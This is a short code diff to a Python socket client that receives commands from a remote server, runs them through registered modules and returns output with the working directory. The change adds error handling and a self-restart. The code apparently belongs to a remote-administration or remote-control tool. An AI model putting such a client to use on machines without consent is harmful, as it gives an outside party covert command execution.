@@ -50,20 +50,27 @@ class Client:
         )
 
         while True:
-            command = self.socket.recv(self.buffer_size).decode()
-            command_data = command.split()
+            try:
+                command = self.socket.recv(self.buffer_size).decode()
+                command_data = command.split()
 
-            command_arguments: list = command_data[1:]
-            command_name: str = command_data[0]
+                command_arguments: list = command_data[1:]
+                command_name: str = command_data[0]
 
-            print(command_arguments)
+                print(command_arguments)
 
-            if command_name.lower() in self.get_commands:
-                output = self.execute_command(command_name, command_arguments)
-                self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
-            else:
-                output = f'{Fore.LIGHTRED_EX}{command_name} is not found!'
-                self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
+                if command_name.lower() in self.get_commands:
+                    output = self.execute_command(command_name, command_arguments)
+                    self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
+                else:
+                    output = f'{Fore.LIGHTRED_EX}{command_name} is not found!'
+                    self.socket.send(f'{output}{self.separator}{self.working_directory}'.encode())
+            except IndexError:
+                self.restart()
+
+    def restart(self):
+        os.system('cls') if self.platform_type == 'win32' else os.system('clear')
+        self.__class__(self.host, self.port)
 
     def execute_command(self, module_name: str, args: list = None) -> str:
         stdout = StringIO()
